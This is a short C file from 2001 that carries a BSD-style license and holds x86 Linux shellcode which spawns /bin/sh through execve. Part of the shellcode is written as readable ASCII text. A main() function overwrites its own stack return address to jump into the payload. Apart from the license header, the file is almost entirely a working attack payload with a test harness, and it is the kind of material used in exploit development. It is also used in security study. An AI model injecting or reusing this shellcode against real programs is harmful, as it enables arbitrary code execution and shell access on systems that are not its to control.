/*
 *  execve ("/bin/sh"..) (linux little endian)
 *
 *  Copyright (c) 2001 Nicola Bonelli <bonelli@antifork.org>
 *
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

char sc[] =   	"\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
		"\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b"
		"AWGN.LOVES.HUMAN.READABLE.SHELLCODES\x44\x44"
		"\x83\xc4\x1c\x40\x40\x4b\x80\xe9\x04\x4a\x46"
		"\x46\x47\x66\x83\xed\x04\xcd\x80";
int
main() {
   long *ret;

   ret = (long *)&ret + 2;
   (*ret) = (long)sc;

   return 0;
}

